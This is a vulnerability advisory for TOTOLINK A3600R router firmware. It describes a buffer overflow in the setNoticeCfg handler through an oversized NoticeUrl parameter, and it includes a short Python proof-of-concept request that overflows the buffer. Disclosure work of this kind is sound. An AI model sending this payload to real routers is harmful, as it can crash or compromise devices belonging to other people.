## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：https://www.totolink.cn/home/menu/detail.html?menu_listtpl=download&id=63&ids=36

## Affected version

A3600R V4.1.2cu.5182_B20201102

## Vulnerability details

In the A3600R V4.1.2cu.5182_B20201102 firmware has a buffer overflow vulnerability in the `setNoticeCfg` function. The `v7` variable receives the `NoticeUrl` parameter from a POST request. However, since the user can control the input of `NoticeUrl`, the `GetDomainName` can cause a buffer overflow vulnerability.

![image-20240721001938458](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721001938458.png)

![image-20240721001952223](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721001952223.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"NoticeUrl":"a"*0x1000,"topicurl":"setNoticeCfg"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240721002157845](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240721002157845.png)
